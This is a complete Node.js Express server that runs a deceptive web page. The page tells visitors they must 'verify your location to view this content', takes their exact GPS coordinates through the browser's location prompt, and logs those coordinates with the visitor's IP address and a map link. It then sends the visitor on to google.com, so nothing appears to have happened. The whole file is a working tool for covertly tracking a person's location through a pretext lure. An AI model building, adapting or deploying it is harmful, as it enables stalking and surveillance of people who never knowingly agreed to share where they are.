const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

// Enable the server to read JSON data sent from the webpage
app.use(express.json());

// 1. Serve the webpage that asks for permission
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading Resource...</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
            .box { text-align: center; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; }
            button { background: #007bff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 4px; cursor: pointer; margin-top: 15px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h3>Permission Required</h3>
            <p>Please verify your location to view this content.</p>
            <button onclick="getLocation()">Verify Location</button>
        </div>

        <script>
            function getLocation() {
                if (navigator.geolocation) {
                    // Triggers the browser's official "Allow" popup
                    navigator.geolocation.getCurrentPosition(sendPosition, showRunError);
                } else {
                    alert("Geolocation is not supported by this browser.");
                    window.location.href = "https://google.com";
                }
            }

            function sendPosition(position) {
                // Prepare the exact coordinates
                const data = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    acc: position.coords.accuracy
                };

                // Send the coordinates silently back to our server backend
                fetch('/log-gps', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    // Redirect to the final destination after logging
                    window.location.href = "https://google.com";
                });
            }

            function showRunError(error) {
                // If they click "Block", redirect them anyway
                window.location.href = "https://google.com";
            }
        </script>
    </body>
    </html>
    `);
});

// 2. Handle the GPS data sent from the webpage
app.post('/log-gps', (req, res) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { lat, lon, acc } = req.body;

    console.log(`--- GPS Coordinates Captured ---`);
    console.log(`Time: ${new Date().toISOString()}`);
    console.log(`IP Address: ${clientIp}`);
    console.log(`Latitude: ${lat}`);
    console.log(`Longitude: ${lon}`);
    console.log(`Accuracy: Within ${acc} meters`);
    console.log(`Google Maps Link: https://google.com/maps?q=${lat},${lon}`);
    console.log(`--------------------------------`);

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
